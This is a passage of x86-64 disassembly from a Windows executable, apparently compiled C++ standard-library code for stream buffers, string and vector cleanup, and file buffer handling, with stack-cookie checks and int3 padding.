   140003a79:	74 15                	je     0x140003a90
   140003a7b:	ba 04 00 00 00       	mov    $0x4,%edx
   140003a80:	8b fa                	mov    %edx,%edi
   140003a82:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%rsp)
   140003a89:	eb 75                	jmp    0x140003b00
   140003a8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a90:	48 85 db             	test   %rbx,%rbx
   140003a93:	7e 66                	jle    0x140003afb
   140003a95:	48 8b 06             	mov    (%rsi),%rax
   140003a98:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003a9c:	4c 8b 44 31 48       	mov    0x48(%rcx,%rsi,1),%r8
   140003aa1:	44 0f b6 4c 31 58    	movzbl 0x58(%rcx,%rsi,1),%r9d
   140003aa7:	49 8b 40 40          	mov    0x40(%r8),%rax
   140003aab:	48 83 38 00          	cmpq   $0x0,(%rax)
   140003aaf:	74 24                	je     0x140003ad5
   140003ab1:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140003ab5:	8b 01                	mov    (%rcx),%eax
   140003ab7:	85 c0                	test   %eax,%eax
   140003ab9:	7e 1a                	jle    0x140003ad5
   140003abb:	ff c8                	dec    %eax
   140003abd:	89 01                	mov    %eax,(%rcx)
   140003abf:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140003ac3:	48 8b 11             	mov    (%rcx),%rdx
   140003ac6:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003aca:	48 89 01             	mov    %rax,(%rcx)
   140003acd:	44 88 0a             	mov    %r9b,(%rdx)
   140003ad0:	41 8b c1             	mov    %r9d,%eax
   140003ad3:	eb 0c                	jmp    0x140003ae1
   140003ad5:	41 8b d1             	mov    %r9d,%edx
   140003ad8:	49 8b 00             	mov    (%r8),%rax
   140003adb:	49 8b c8             	mov    %r8,%rcx
   140003ade:	ff 50 18             	call   *0x18(%rax)
   140003ae1:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003ae4:	75 10                	jne    0x140003af6
   140003ae6:	ba 04 00 00 00       	mov    $0x4,%edx
   140003aeb:	8b fa                	mov    %edx,%edi
   140003aed:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%rsp)
   140003af4:	eb 0a                	jmp    0x140003b00
   140003af6:	48 ff cb             	dec    %rbx
   140003af9:	eb 95                	jmp    0x140003a90
   140003afb:	ba 04 00 00 00       	mov    $0x4,%edx
   140003b00:	48 8b 06             	mov    (%rsi),%rax
   140003b03:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003b07:	4c 89 6c 31 28       	mov    %r13,0x28(%rcx,%rsi,1)
   140003b0c:	eb 1c                	jmp    0x140003b2a
   140003b0e:	45 33 ed             	xor    %r13d,%r13d
   140003b11:	ba 04 00 00 00       	mov    $0x4,%edx
   140003b16:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140003b1d:	00 
   140003b1e:	8b bc 24 b0 00 00 00 	mov    0xb0(%rsp),%edi
   140003b25:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140003b2a:	48 8b 06             	mov    (%rsi),%rax
   140003b2d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003b31:	48 83 7c 31 48 00    	cmpq   $0x0,0x48(%rcx,%rsi,1)
   140003b37:	41 0f 45 d5          	cmovne %r13d,%edx
   140003b3b:	0b 54 31 10          	or     0x10(%rcx,%rsi,1),%edx
   140003b3f:	0b d7                	or     %edi,%edx
   140003b41:	83 e2 17             	and    $0x17,%edx
   140003b44:	89 54 31 10          	mov    %edx,0x10(%rcx,%rsi,1)
   140003b48:	23 54 31 14          	and    0x14(%rcx,%rsi,1),%edx
   140003b4c:	75 47                	jne    0x140003b95
   140003b4e:	e8 e1 3c 00 00       	call   0x140007834
   140003b53:	85 c0                	test   %eax,%eax
   140003b55:	75 09                	jne    0x140003b60
   140003b57:	49 8b cf             	mov    %r15,%rcx
   140003b5a:	e8 11 2b 00 00       	call   0x140006670
   140003b5f:	90                   	nop
   140003b60:	49 8b 07             	mov    (%r15),%rax
   140003b63:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003b67:	4a 8b 4c 39 48       	mov    0x48(%rcx,%r15,1),%rcx
   140003b6c:	48 85 c9             	test   %rcx,%rcx
   140003b6f:	74 07                	je     0x140003b78
   140003b71:	48 8b 01             	mov    (%rcx),%rax
   140003b74:	ff 50 10             	call   *0x10(%rax)
   140003b77:	90                   	nop
   140003b78:	48 8b c6             	mov    %rsi,%rax
   140003b7b:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003b80:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140003b84:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140003b88:	49 8b e3             	mov    %r11,%rsp
   140003b8b:	41 5f                	pop    %r15
   140003b8d:	41 5e                	pop    %r14
   140003b8f:	41 5d                	pop    %r13
   140003b91:	41 5c                	pop    %r12
   140003b93:	5f                   	pop    %rdi
   140003b94:	c3                   	ret
   140003b95:	f6 c2 04             	test   $0x4,%dl
   140003b98:	74 09                	je     0x140003ba3
   140003b9a:	48 8d 1d 37 0c 03 00 	lea    0x30c37(%rip),%rbx        # 0x1400347d8
   140003ba1:	eb 15                	jmp    0x140003bb8
   140003ba3:	f6 c2 02             	test   $0x2,%dl
   140003ba6:	48 8d 1d 43 0c 03 00 	lea    0x30c43(%rip),%rbx        # 0x1400347f0
   140003bad:	48 8d 05 54 0c 03 00 	lea    0x30c54(%rip),%rax        # 0x140034808
   140003bb4:	48 0f 44 d8          	cmove  %rax,%rbx
   140003bb8:	ba 01 00 00 00       	mov    $0x1,%edx
   140003bbd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003bc2:	e8 c9 d8 ff ff       	call   0x140001490
   140003bc7:	4c 8b c0             	mov    %rax,%r8
   140003bca:	48 8b d3             	mov    %rbx,%rdx
   140003bcd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003bd2:	e8 79 e1 ff ff       	call   0x140001d50
   140003bd7:	48 8d 15 d2 53 03 00 	lea    0x353d2(%rip),%rdx        # 0x140038fb0
   140003bde:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003be3:	e8 e0 63 00 00       	call   0x140009fc8
   140003be8:	cc                   	int3
   140003be9:	cc                   	int3
   140003bea:	cc                   	int3
   140003beb:	cc                   	int3
   140003bec:	cc                   	int3
   140003bed:	cc                   	int3
   140003bee:	cc                   	int3
   140003bef:	cc                   	int3
   140003bf0:	40 53                	rex push %rbx
   140003bf2:	48 83 ec 20          	sub    $0x20,%rsp
   140003bf6:	48 8b 01             	mov    (%rcx),%rax
   140003bf9:	48 8b d9             	mov    %rcx,%rbx
   140003bfc:	48 85 c0             	test   %rax,%rax
   140003bff:	74 43                	je     0x140003c44
   140003c01:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140003c05:	48 2b d0             	sub    %rax,%rdx
   140003c08:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c0f:	72 1e                	jb     0x140003c2f
   140003c11:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003c15:	48 2b c1             	sub    %rcx,%rax
   140003c18:	48 83 e8 08          	sub    $0x8,%rax
   140003c1c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c20:	77 06                	ja     0x140003c28
   140003c22:	48 83 c2 27          	add    $0x27,%rdx
   140003c26:	eb 0a                	jmp    0x140003c32
   140003c28:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003c2d:	cd 29                	int    $0x29
   140003c2f:	48 8b c8             	mov    %rax,%rcx
   140003c32:	e8 dd 48 00 00       	call   0x140008514
   140003c37:	33 c0                	xor    %eax,%eax
   140003c39:	48 89 03             	mov    %rax,(%rbx)
   140003c3c:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003c40:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140003c44:	48 83 c4 20          	add    $0x20,%rsp
   140003c48:	5b                   	pop    %rbx
   140003c49:	c3                   	ret
   140003c4a:	cc                   	int3
   140003c4b:	cc                   	int3
   140003c4c:	cc                   	int3
   140003c4d:	cc                   	int3
   140003c4e:	cc                   	int3
   140003c4f:	cc                   	int3
   140003c50:	40 53                	rex push %rbx
   140003c52:	48 83 ec 20          	sub    $0x20,%rsp
   140003c56:	48 8b d9             	mov    %rcx,%rbx
   140003c59:	48 8b 09             	mov    (%rcx),%rcx
   140003c5c:	48 85 c9             	test   %rcx,%rcx
   140003c5f:	74 05                	je     0x140003c66
   140003c61:	e8 6a b6 00 00       	call   0x14000f2d0
   140003c66:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140003c6d:	48 83 c4 20          	add    $0x20,%rsp
   140003c71:	5b                   	pop    %rbx
   140003c72:	c3                   	ret
   140003c73:	cc                   	int3
   140003c74:	cc                   	int3
   140003c75:	cc                   	int3
   140003c76:	cc                   	int3
   140003c77:	cc                   	int3
   140003c78:	cc                   	int3
   140003c79:	cc                   	int3
   140003c7a:	cc                   	int3
   140003c7b:	cc                   	int3
   140003c7c:	cc                   	int3
   140003c7d:	cc                   	int3
   140003c7e:	cc                   	int3
   140003c7f:	cc                   	int3
   140003c80:	40 53                	rex push %rbx
   140003c82:	48 83 ec 20          	sub    $0x20,%rsp
   140003c86:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140003c8a:	48 8b d9             	mov    %rcx,%rbx
   140003c8d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003c91:	76 35                	jbe    0x140003cc8
   140003c93:	48 8b 01             	mov    (%rcx),%rax
   140003c96:	48 ff c2             	inc    %rdx
   140003c99:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003ca0:	72 1e                	jb     0x140003cc0
   140003ca2:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140003ca6:	48 2b c1             	sub    %rcx,%rax
   140003ca9:	48 83 e8 08          	sub    $0x8,%rax
   140003cad:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003cb1:	77 06                	ja     0x140003cb9
   140003cb3:	48 83 c2 27          	add    $0x27,%rdx
   140003cb7:	eb 0a                	jmp    0x140003cc3
   140003cb9:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003cbe:	cd 29                	int    $0x29
   140003cc0:	48 8b c8             	mov    %rax,%rcx
   140003cc3:	e8 4c 48 00 00       	call   0x140008514
   140003cc8:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140003ccf:	00 
   140003cd0:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140003cd7:	00 
   140003cd8:	c6 03 00             	movb   $0x0,(%rbx)
   140003cdb:	48 83 c4 20          	add    $0x20,%rsp
   140003cdf:	5b                   	pop    %rbx
   140003ce0:	c3                   	ret
   140003ce1:	cc                   	int3
   140003ce2:	cc                   	int3
   140003ce3:	cc                   	int3
   140003ce4:	cc                   	int3
   140003ce5:	cc                   	int3
   140003ce6:	cc                   	int3
   140003ce7:	cc                   	int3
   140003ce8:	cc                   	int3
   140003ce9:	cc                   	int3
   140003cea:	cc                   	int3
   140003ceb:	cc                   	int3
   140003cec:	cc                   	int3
   140003ced:	cc                   	int3
   140003cee:	cc                   	int3
   140003cef:	cc                   	int3
   140003cf0:	4c 8b dc             	mov    %rsp,%r11
   140003cf3:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   140003cf7:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   140003cfb:	45 89 4b 20          	mov    %r9d,0x20(%r11)
   140003cff:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140003d03:	56                   	push   %rsi
   140003d04:	57                   	push   %rdi
   140003d05:	41 56                	push   %r14
   140003d07:	48 83 ec 60          	sub    $0x60,%rsp
   140003d0b:	41 8b f8             	mov    %r8d,%edi
   140003d0e:	48 8b f2             	mov    %rdx,%rsi
   140003d11:	4c 8b f1             	mov    %rcx,%r14
   140003d14:	33 ed                	xor    %ebp,%ebp
   140003d16:	41 89 6b 20          	mov    %ebp,0x20(%r11)
   140003d1a:	48 8d 05 cf 0e 03 00 	lea    0x30ecf(%rip),%rax        # 0x140034bf0
   140003d21:	48 89 01             	mov    %rax,(%rcx)
   140003d24:	48 89 a9 b0 00 00 00 	mov    %rbp,0xb0(%rcx)
   140003d2b:	48 89 a9 b8 00 00 00 	mov    %rbp,0xb8(%rcx)
   140003d32:	89 a9 c0 00 00 00    	mov    %ebp,0xc0(%rcx)
   140003d38:	48 89 a9 c8 00 00 00 	mov    %rbp,0xc8(%rcx)
   140003d3f:	48 89 a9 d0 00 00 00 	mov    %rbp,0xd0(%rcx)
   140003d46:	48 89 a9 d8 00 00 00 	mov    %rbp,0xd8(%rcx)
   140003d4d:	48 89 a9 e0 00 00 00 	mov    %rbp,0xe0(%rcx)
   140003d54:	48 89 a9 e8 00 00 00 	mov    %rbp,0xe8(%rcx)
   140003d5b:	48 8d 05 86 0e 03 00 	lea    0x30e86(%rip),%rax        # 0x140034be8
   140003d62:	48 89 81 a8 00 00 00 	mov    %rax,0xa8(%rcx)
   140003d69:	48 89 a9 f0 00 00 00 	mov    %rbp,0xf0(%rcx)
   140003d70:	48 89 a9 f8 00 00 00 	mov    %rbp,0xf8(%rcx)
   140003d77:	40 88 a9 00 01 00 00 	mov    %bpl,0x100(%rcx)
   140003d7e:	41 c7 43 20 01 00 00 	movl   $0x1,0x20(%r11)
   140003d85:	00 
   140003d86:	48 8b 01             	mov    (%rcx),%rax
   140003d89:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003d8d:	48 8d 05 a4 0e 03 00 	lea    0x30ea4(%rip),%rax        # 0x140034c38
   140003d94:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   140003d98:	49 8b 06             	mov    (%r14),%rax
   140003d9b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003d9f:	8d 51 f0             	lea    -0x10(%rcx),%edx
   140003da2:	42 89 54 31 fc       	mov    %edx,-0x4(%rcx,%r14,1)
   140003da7:	49 8b 06             	mov    (%r14),%rax
   140003daa:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003dae:	49 03 ce             	add    %r14,%rcx
   140003db1:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140003db5:	e8 76 29 00 00       	call   0x140006730
   140003dba:	90                   	nop
   140003dbb:	49 8b 06             	mov    (%r14),%rax
   140003dbe:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003dc2:	48 8d 05 0f 0e 03 00 	lea    0x30e0f(%rip),%rax        # 0x140034bd8
   140003dc9:	4a 89 04 32          	mov    %rax,(%rdx,%r14,1)
   140003dcd:	49 8b 06             	mov    (%r14),%rax
   140003dd0:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003dd4:	44 8d 82 58 ff ff ff 	lea    -0xa8(%rdx),%r8d
   140003ddb:	46 89 44 32 fc       	mov    %r8d,-0x4(%rdx,%r14,1)
   140003de0:	49 8d 4e 08          	lea    0x8(%r14),%rcx
   140003de4:	e8 87 1f 00 00       	call   0x140005d70
   140003de9:	90                   	nop
   140003dea:	83 cf 02             	or     $0x2,%edi
   140003ded:	44 8b c7             	mov    %edi,%r8d
   140003df0:	48 8b d6             	mov    %rsi,%rdx
   140003df3:	49 8d 4e 08          	lea    0x8(%r14),%rcx
   140003df7:	e8 04 1e 00 00       	call   0x140005c00
   140003dfc:	48 85 c0             	test   %rax,%rax
   140003dff:	75 2b                	jne    0x140003e2c
   140003e01:	49 8b 06             	mov    (%r14),%rax
   140003e04:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003e08:	ba 04 00 00 00       	mov    $0x4,%edx
   140003e0d:	4a 39 6c 31 48       	cmp    %rbp,0x48(%rcx,%r14,1)
   140003e12:	0f 45 d5             	cmovne %ebp,%edx
   140003e15:	42 0b 54 31 10       	or     0x10(%rcx,%r14,1),%edx
   140003e1a:	83 e2 15             	and    $0x15,%edx
   140003e1d:	83 ca 02             	or     $0x2,%edx
   140003e20:	42 89 54 31 10       	mov    %edx,0x10(%rcx,%r14,1)
   140003e25:	42 23 54 31 14       	and    0x14(%rcx,%r14,1),%edx
   140003e2a:	75 18                	jne    0x140003e44
   140003e2c:	49 8b c6             	mov    %r14,%rax
   140003e2f:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140003e34:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140003e38:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140003e3c:	49 8b e3             	mov    %r11,%rsp
   140003e3f:	41 5e                	pop    %r14
   140003e41:	5f                   	pop    %rdi
   140003e42:	5e                   	pop    %rsi
   140003e43:	c3                   	ret
   140003e44:	f6 c2 04             	test   $0x4,%dl
   140003e47:	74 09                	je     0x140003e52
   140003e49:	48 8d 1d 88 09 03 00 	lea    0x30988(%rip),%rbx        # 0x1400347d8
   140003e50:	eb 15                	jmp    0x140003e67
   140003e52:	f6 c2 02             	test   $0x2,%dl
   140003e55:	48 8d 1d 94 09 03 00 	lea    0x30994(%rip),%rbx        # 0x1400347f0
   140003e5c:	48 8d 05 a5 09 03 00 	lea    0x309a5(%rip),%rax        # 0x140034808
   140003e63:	48 0f 44 d8          	cmove  %rax,%rbx
   140003e67:	ba 01 00 00 00       	mov    $0x1,%edx
   140003e6c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003e71:	e8 1a d6 ff ff       	call   0x140001490
   140003e76:	4c 8b c0             	mov    %rax,%r8
   140003e79:	48 8b d3             	mov    %rbx,%rdx
   140003e7c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003e81:	e8 ca de ff ff       	call   0x140001d50
   140003e86:	48 8d 15 23 51 03 00 	lea    0x35123(%rip),%rdx        # 0x140038fb0
   140003e8d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003e92:	e8 31 61 00 00       	call   0x140009fc8
   140003e97:	cc                   	int3
   140003e98:	cc                   	int3
   140003e99:	cc                   	int3
   140003e9a:	cc                   	int3
   140003e9b:	cc                   	int3
   140003e9c:	cc                   	int3
   140003e9d:	cc                   	int3
   140003e9e:	cc                   	int3
   140003e9f:	cc                   	int3
   140003ea0:	40 53                	rex push %rbx
   140003ea2:	48 83 ec 20          	sub    $0x20,%rsp
   140003ea6:	48 8b d9             	mov    %rcx,%rbx
   140003ea9:	48 8b ca             	mov    %rdx,%rcx
   140003eac:	e8 6f 18 00 00       	call   0x140005720
   140003eb1:	48 8b d0             	mov    %rax,%rdx
   140003eb4:	48 8b cb             	mov    %rbx,%rcx
   140003eb7:	48 83 c4 20          	add    $0x20,%rsp
   140003ebb:	5b                   	pop    %rbx
   140003ebc:	e9 cf 1a 00 00       	jmp    0x140005990
   140003ec1:	cc                   	int3
   140003ec2:	cc                   	int3
   140003ec3:	cc                   	int3
   140003ec4:	cc                   	int3
   140003ec5:	cc                   	int3
   140003ec6:	cc                   	int3
   140003ec7:	cc                   	int3
   140003ec8:	cc                   	int3
   140003ec9:	cc                   	int3
   140003eca:	cc                   	int3
   140003ecb:	cc                   	int3
   140003ecc:	cc                   	int3
   140003ecd:	cc                   	int3
   140003ece:	cc                   	int3
   140003ecf:	cc                   	int3
   140003ed0:	40 53                	rex push %rbx
   140003ed2:	48 83 ec 20          	sub    $0x20,%rsp
   140003ed6:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140003edd:	00 
   140003ede:	48 8b d9             	mov    %rcx,%rbx
   140003ee1:	74 2c                	je     0x140003f0f
   140003ee3:	48 8b 01             	mov    (%rcx),%rax
   140003ee6:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140003eeb:	ff 50 18             	call   *0x18(%rax)
   140003eee:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003ef1:	74 1c                	je     0x140003f0f
   140003ef3:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140003efa:	e8 4d a2 00 00       	call   0x14000e14c
   140003eff:	33 c9                	xor    %ecx,%ecx
   140003f01:	85 c0                	test   %eax,%eax
   140003f03:	0f 99 c1             	setns  %cl
   140003f06:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003f09:	48 83 c4 20          	add    $0x20,%rsp
   140003f0d:	5b                   	pop    %rbx
   140003f0e:	c3                   	ret
   140003f0f:	33 c0                	xor    %eax,%eax
   140003f11:	48 83 c4 20          	add    $0x20,%rsp
   140003f15:	5b                   	pop    %rbx
   140003f16:	c3                   	ret
   140003f17:	cc                   	int3
   140003f18:	cc                   	int3
   140003f19:	cc                   	int3
   140003f1a:	cc                   	int3
   140003f1b:	cc                   	int3
   140003f1c:	cc                   	int3
   140003f1d:	cc                   	int3
   140003f1e:	cc                   	int3
   140003f1f:	cc                   	int3
   140003f20:	40 53                	rex push %rbx
   140003f22:	56                   	push   %rsi
   140003f23:	48 83 ec 48          	sub    $0x48,%rsp
   140003f27:	48 8b 05 52 61 03 00 	mov    0x36152(%rip),%rax        # 0x14003a080
   140003f2e:	48 33 c4             	xor    %rsp,%rax
   140003f31:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003f36:	33 f6                	xor    %esi,%esi
   140003f38:	4d 8b c8             	mov    %r8,%r9
   140003f3b:	48 8b d9             	mov    %rcx,%rbx
   140003f3e:	48 85 d2             	test   %rdx,%rdx
   140003f41:	75 0b                	jne    0x140003f4e
   140003f43:	4d 85 c0             	test   %r8,%r8
   140003f46:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003f4c:	74 03                	je     0x140003f51
   140003f4e:	44 8b c6             	mov    %esi,%r8d
   140003f51:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140003f58:	48 85 c9             	test   %rcx,%rcx
   140003f5b:	0f 84 d3 00 00 00    	je     0x140004034
   140003f61:	e8 ba b1 00 00       	call   0x14000f120
   140003f66:	85 c0                	test   %eax,%eax
   140003f68:	0f 85 c6 00 00 00    	jne    0x140004034
   140003f6e:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140003f72:	4c 8d 53 08          	lea    0x8(%rbx),%r10
   140003f76:	4c 89 53 18          	mov    %r10,0x18(%rbx)
   140003f7a:	4c 8d 43 10          	lea    0x10(%rbx),%r8
   140003f7e:	4c 89 43 20          	mov    %r8,0x20(%rbx)
   140003f82:	4c 8d 4b 28          	lea    0x28(%rbx),%r9
   140003f86:	4c 89 4b 38          	mov    %r9,0x38(%rbx)
   140003f8a:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   140003f8e:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140003f92:	48 8d 53 48          	lea    0x48(%rbx),%rdx
   140003f96:	48 89 53 50          	mov    %rdx,0x50(%rbx)
   140003f9a:	48 8d 43 4c          	lea    0x4c(%rbx),%rax
   140003f9e:	48 89 43 58          	mov    %rax,0x58(%rbx)
   140003fa2:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140003fa6:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140003fab:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   140003fb2:	49 89 30             	mov    %rsi,(%r8)
   140003fb5:	48 89 31             	mov    %rsi,(%rcx)
   140003fb8:	89 30                	mov    %esi,(%rax)
   140003fba:	49 89 32             	mov    %rsi,(%r10)
   140003fbd:	49 89 31             	mov    %rsi,(%r9)
   140003fc0:	89 32                	mov    %esi,(%rdx)
   140003fc2:	48 85 ff             	test   %rdi,%rdi
   140003fc5:	74 4d                	je     0x140004014
   140003fc7:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140003fcc:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003fd1:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140003fd6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003fdb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003fe0:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003fe5:	48 8b cf             	mov    %rdi,%rcx
   140003fe8:	e8 4b ab 00 00       	call   0x14000eb38
   140003fed:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003ff2:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140003ff6:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140003ffa:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003fff:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   140004003:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140004007:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000400c:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   140004010:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   140004014:	48 8b 0d ad 82 03 00 	mov    0x382ad(%rip),%rcx        # 0x14003c2c8
   14000401b:	48 8b c3             	mov    %rbx,%rax
   14000401e:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140004025:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000402a:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   14000402e:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   140004032:	eb 02                	jmp    0x140004036
   140004034:	33 c0                	xor    %eax,%eax
   140004036:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000403b:	48 33 cc             	xor    %rsp,%rcx
   14000403e:	e8 6d 44 00 00       	call   0x1400084b0
   140004043:	48 83 c4 48          	add    $0x48,%rsp
   140004047:	5e                   	pop    %rsi
   140004048:	5b                   	pop    %rbx
   140004049:	c3                   	ret
   14000404a:	cc                   	int3
   14000404b:	cc                   	int3
   14000404c:	cc                   	int3
   14000404d:	cc                   	int3
   14000404e:	cc                   	int3
   14000404f:	cc                   	int3
   140004050:	40 53                	rex push %rbx
   140004052:	56                   	push   %rsi
   140004053:	57                   	push   %rdi
   140004054:	48 83 ec 30          	sub    $0x30,%rsp
   140004058:	48 8b 05 21 60 03 00 	mov    0x36021(%rip),%rax        # 0x14003a080
   14000405f:	48 33 c4             	xor    %rsp,%rax
   140004062:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004067:	49 8b 40 08          	mov    0x8(%r8),%rax
   14000406b:	49 8b f0             	mov    %r8,%rsi
   14000406e:	49 03 00             	add    (%r8),%rax
   140004071:	48 8b da             	mov    %rdx,%rbx
   140004074:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000407b:	00 
   14000407c:	48 8b f9             	mov    %rcx,%rdi
   14000407f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004084:	74 6f                	je     0x1400040f5
   140004086:	e8 85 19 00 00       	call   0x140005a10
   14000408b:	84 c0                	test   %al,%al
   14000408d:	74 66                	je     0x1400040f5
   14000408f:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140004096:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000409b:	e8 b0 b3 00 00       	call   0x14000f450
   1400040a0:	85 c0                	test   %eax,%eax
   1400040a2:	75 51                	jne    0x1400040f5
   1400040a4:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400040a8:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400040ac:	48 89 47 74          	mov    %rax,0x74(%rdi)
   1400040b0:	48 8d 47 70          	lea    0x70(%rdi),%rax
   1400040b4:	48 39 01             	cmp    %rax,(%rcx)
   1400040b7:	75 22                	jne    0x1400040db
   1400040b9:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   1400040c0:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   1400040c7:	48 89 11             	mov    %rdx,(%rcx)
   1400040ca:	44 2b c2             	sub    %edx,%r8d
   1400040cd:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   1400040d1:	48 89 11             	mov    %rdx,(%rcx)
   1400040d4:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   1400040d8:	44 89 01             	mov    %r8d,(%rcx)
   1400040db:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   1400040df:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400040e4:	48 89 0b             	mov    %rcx,(%rbx)
   1400040e7:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   1400040eb:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400040f2:	00 
   1400040f3:	eb 15                	jmp    0x14000410a
   1400040f5:	33 c0                	xor    %eax,%eax
   1400040f7:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   1400040fe:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140004105:	00 
   140004106:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000410a:	48 8b c3             	mov    %rbx,%rax
   14000410d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004112:	48 33 cc             	xor    %rsp,%rcx
   140004115:	e8 96 43 00 00       	call   0x1400084b0
   14000411a:	48 83 c4 30          	add    $0x30,%rsp
   14000411e:	5f                   	pop    %rdi
   14000411f:	5e                   	pop    %rsi
   140004120:	5b                   	pop    %rbx
   140004121:	c3                   	ret
   140004122:	cc                   	int3
   140004123:	cc                   	int3
   140004124:	cc                   	int3
   140004125:	cc                   	int3
   140004126:	cc                   	int3
   140004127:	cc                   	int3
   140004128:	cc                   	int3
   140004129:	cc                   	int3
   14000412a:	cc                   	int3
   14000412b:	cc                   	int3
   14000412c:	cc                   	int3
   14000412d:	cc                   	int3
   14000412e:	cc                   	int3
   14000412f:	cc                   	int3
   140004130:	40 53                	rex push %rbx
   140004132:	55                   	push   %rbp
   140004133:	56                   	push   %rsi
   140004134:	57                   	push   %rdi
   140004135:	41 56                	push   %r14
